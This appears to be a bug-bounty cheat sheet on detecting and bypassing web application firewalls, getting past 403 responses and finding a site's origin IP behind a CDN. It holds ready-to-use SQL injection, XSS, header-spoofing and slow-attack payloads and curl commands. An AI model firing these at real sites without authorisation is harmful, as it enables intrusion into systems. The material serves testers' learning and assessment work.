
##### Identify waf technology:
```bash
sudo nmap bugcrowd.com -p80,443 --script=http-waf-fingerprint -v
sudo nmap bugcrowd.com -p80,443 --script=http-waf-detect -v
wafw00f hackerone.com
```

Common WAF Detection Methods: 

```bash
# Modern WAFs use rule-based filtering, signature matching, machine learning models #and behavior analysis. Popular WAF providers include Cloudflare, Akamai, AWS WAF, #Imperva and F5.

✅ Signature-Based Detection — Blocks known attack patterns (e.g., UNION SELECT, <script>)

✅ Rate Limiting – Blocks too many requests from the same IP 

✅ Input Sanitization – Removes special characters from user input 

✅ Behavioral Analysis – Detects patterns in traffic and blocks suspicious behavior

✅ GeoIP & ASN Filtering
	Blocks IPs based on country or ASN (cloud provider).
	Example: blocks requests from AWS, GCP, DigitalOcean.
	
✅ Header Inspection
    Blocks requests with missing or spoofed headers:
        User-Agent
        Referer
        X-Requested-With
        
✅ Keyword Obfuscation Detection
    Detects attacks even with obfuscated payloads:
        U%4eION%20SE%4cECT
        String.fromCharCode(97,108,101,114,116)
        
✅ Protocol/Method Filtering
    Blocks:
        Specific HTTP methods (e.g., PUT, TRACE, OPTIONS)
        Large or malformed requests
        
✅ Cookie & CSRF Token Enforcement:
    Requires valid session tokens or anti-CSRF tokens.
    Blocks or redirects if missing/invalid.
    
✅ Referrer & Origin Checking
    Blocks external requests without proper Referer or Origin headers.
    Common in WAFs protecting admin panels or APIs.
    
✅ ML-Based Detection — 
	Newer WAFs now use trained models to detect obfuscated payloads

✅ Heuristics & Behavior — 
	Blocking based on behavioral patterns (e.g., timing, repetition)


✅ Custom Rules (ModSecurity / NAXSI / AWS WAF)
    Self-defined rulesets like:
        Block eval( in any input
        Allow POST only to /submit

#Modern, WAFs are more integrated with:

#Threat intelligence feeds
#Real-time learning models
#Bot detection engines
```

```bash
🧪 WAF Detection Tips (as an attacker or tester):
     Do curl or ffuf requests fail but browsers work? → Header/JS check
     Do aggressive scans get blocked after N requests? → Rate limiting
     Are cloud IPs blocked but home IP works? → Geo/ASN filter
     Does the site issue JS-based redirects? → Challenge verification
     Is 403 returned on POST to /login with missing CSRF? → Token enforcement
```


##### WAF Bypass Techniques :

Technique #1: Payload Obfuscation
- Used encoding and double encoding
- Used various type of encoding like base64 , url encoding , or more
- String Splitting ,String Concatenation:
```bash
#example payload
SEL/**/ECT * FROM users --
UNION → 'UNI'+'ON'

SELECT%u0020*%u0020FROM%u0020users%u0020WHERE%u0020id=1
 ' OR 1=1 --'
 %27%20OR%201%3D1%20--

#Base64 encode payloads
#Use JSON or XML-based requests instead of URL parameters
#Use multipart/form-data to deliver payloads hidden in file uploads or fields
```


Technique #2: HTTP Parameter Pollution (HPP)
-  Duplicating parameters in the request to confuse the WAF.
```bash
GET /search?query=<script>alert(1)</script>             #blocked 
GET /search?query=<script>&query=alert(1)</script>#bypassed 
?id=1&id=2
```


Technique #3: Header Manipulation
- Most WAFs block attacks based on request headers, but some rely only on specific headers like User-Agent and Referrer.
```bash
#blocked
GET /admin-panel HTTP/1.1
User-Agent: Mozilla/5.0 (hacker-tool)

#allowed
GET /admin-panel HTTP/1.1
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)

#example of headers.
X-Forwarded-For, X-Originating-IP, or User-Agent

curl --header "Host: target.com" http://IP-ADDRESS

curl -X POST "https://target.com/login" \  
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \  
-H "X-Forwarded-For: 127.0.0.1" \  
-H "Accept-Language: en-US,en;q=0.9" \  
-H "Content-Type: application/json" \  
--data-raw '{"username":"admin'\'' OR 1=1--", "password":"any"}'

curl -X GET "https://target.com/admin" \  
-H "Random-Header: $(openssl rand -hex 8)" \  
-H "Referer: https://google.com"

curl -X POST "https://target.com/api" \  
-H "Transfer-Encoding: chunked" \  
--data-binary @malicious_payload.txt

Try IPv6 if the website has IPv6 enabled.

```


 Technique #4: Case Manipulation (WAF Case Sensitivity Bypass)
 - Some WAFs only block lowercase attack keywords but ignore uppercase variations.
```bash
#blocked 
GET /search?q=<script>alert(1)</script>

#case variation allowed
GET /search?q=<ScRiPt>alert(1)</ScRiPt>

curl -X GET "https://target.com/ADMIN/../LoGiN" \  
-H "User-Agent: cURL/7.68.0"
```

 
 Technique #5: Change the method
 - WAF was only filtering GET requests, but POST requests were not being sanitized.
```bash
 POST /api/v1/admin-login
Content-Type: application/json

{"username": "admin", "password": "' OR '1'='1' --"}
```


 Technique #6: Tamper Scripts(SQLMAP)
 ```bash
 --tamper=between,randomcase,charunicodeencode,space2comment
```


Technique #7: Payload Wrapping
```bash
UN/**/ION/**/SELECT #Wrap payloads in SQL or HTML comments:

<scr<script>ipt>alert(1)</script> #malformed script
```

Technique #8 : Low and Slow Attacks
- Use tools like slowloris or slowhttptest
- Send payloads byte-by-byte with delays to avoid detection

Technique #9 : Time-Based Triggering
- Use timing payloads (especially for blind SQLi):
```bash
IF(1=1, SLEEP(5), 0)
```

Technique #10 : Second-Order Attacks
- Store payloads in one location that gets executed in another (e.g., admin panel)
- WAFs may miss these since the injection isn’t directly executed



403 forbidden bypass :

Technique #1: Header Manipulation

```bash
Referer: https://target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization
X-Forwarded-For
X-Forward-For
X-Remote-IP
X-Originating-IP
X-Remote-Addr
X-Client-IP
X-Real-IP


curl -X GET https://target.com/ -H “X-Original-URL: /admin”
curl -H "Host: alternative.example.com or google.com" http://example.com/secret/



✔️ Modify headers like Referer, X-Original-URL, X-Rewrite-URL.

```

Technique #2: Directory Traversal Tricks
```bash
Adding a slash:
https://target.com/admin/

Appending null byte:
https://target.com/admin%00

URL encoding:
https://target.com/%2e%2e/admin

curl http://example.com/../secret/


/admin/(admin slash), you could try /admin/’,/admin%2e/, or/admin/.htaccess`.
http://example.com/secret/http://example.com/secret..;/http://example.com/secret.


String terminators (%00, 0x00, //, ;, %, !, ?, [] etc.) — adding those to the end of the path and inside the path


some bypass to try :
site.com/secret –> HTTP 403 Forbidden
site.com/SECRET –> HTTP 200 OK
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK
site.com/;/secret –> HTTP 200 OK
site.com/.;/secret –> HTTP 200 OK
site.com//;//secret –> HTTP 200 OK
site.com/secret.json –> HTTP 200 OK (ruby


```

Technique #3: Method swapping
```bash
✔️ Always test multiple HTTP methods (GET, POST, OPTIONS, TRACE, PUT, HEAD).

curl -X TRACE https://target.com/ -H “User-Agent: Custom”
curl -X POST https://target.com/ -H "X-HTTP-Method-Override: DELETE" (spoof header)

```

Technique #4 : Bypass with Case Manipulation
```bash
http://example.com/SeCrEt/
```

Technique #5 :  Leverage Proxy or IP Spoofing
```bash
proxychains curl http://example.com/secret/
```

Technique #6: Check for Backup Files or Alternate Endpoints
```bash
curl http://example.com/secret.bak # directory brute force . directly file brute force for bypass 403 
```

Technique #7: Switch Between HTTP and HTTPS
```bash
http://example.com/secret/https://example.com/secret/
```


✔️ Check for WAF/CDN filtering that may be bypassed.


Automated tools :
https://github.com/iamj0ker/bypass-403
https://github.com/Dheerajmadhukar/4-ZERO-3
https://github.com/byt3hx/403-bypass
https://github.com/offsecdawn/403bypass?source=post_page-----50bc0663daa0---------------------------------------
https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122



Find real IP behind WAF :

Technique 1: Direct search 
- search domain name in shodan or censys
	- https://securitytrails.com/
	- https://search.censys.io/
	- https://github.com/m0rtem/CloudFail
	- https://www.shodan.io/
	- shodan search query : "ssl.cert.subject.CN=DomainName.com" or "http.title:’Welcome to NGINX’"


Technique 2 : Certificate.
```bash
censys search 'parsed.subject_dn: "CN=target.com"' --index-type certificates
```

Technique 3. Subdomains
using the identify the subdomain misconfigure route to cdn
```bash
# Step 1: Gather subdomains
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subs.txt amass_subs.txt | sort -u > all_subs.txt

# Step 2: Probe live subdomains
httpx -l all_subs.txt -ip -sc -title -o live_subs.txt

# Step 3: Extract subdomains pointing to real IPs (non-CDN)
cat live_subs.txt | grep -vE 'cloudflare|akamai|fastly' > potential_origin_ips.txt

dnsx -l all_subs.txt -a -resp-only | tee subdomain_ips.txt

```


Technique 4. DNS History:
```bash

SecurityTrails (https://securitytrails.com)
Complete DNS (https://completedns.com/dns-history/)
https://viewdns.info/iphistory/
```


Technique 5: using favicon hash:
```bash
Identifying the favicon URL of the web site under consideration.
Getting MD5 hash of the favicon.
To look for this hash in websites that specialize in security, this is either Shodan or Censys .
Analyzing returned IPs to find out possible origin servers.
```

Automated tools :
https://github.com/Dheerajmadhukar/Lilly
https://github.com/Dheerajmadhukar/4-ZERO-3
https://github.com/zidansec/CloudPeler